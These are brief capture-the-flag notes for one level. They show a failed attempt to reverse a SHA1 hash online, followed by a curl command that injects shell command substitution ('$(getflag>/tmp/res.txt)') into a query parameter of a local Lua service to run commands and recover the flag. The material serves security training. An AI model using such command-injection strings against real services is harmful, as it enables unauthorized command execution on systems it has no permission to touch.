# useful links
* https://www.lua.org/about.html

# cmd
* ``ls``
    * level11.lua -> it's also a binary
* ``cat level11.lua`` -> see level11.lua
* try 1 : reverse sha1sum on internet of h
    * https://sha1.gromweb.com/?hash=f05d1d066fb246efe0c6f7d095f909a7a0cf34a0 -> NotSoEasy :rofl:
* try 2 : having fun with curl
    * ``curl 'localhost:5151?pass=$(getflag)'`` -> ``Password: Erf nope..``
        * we have to good method but we have to save the flag before hash
    * ``curl 'localhost:5151?pass=$(getflag>/tmp/res.txt)'``
    * ``cat /tmp/res.txt``
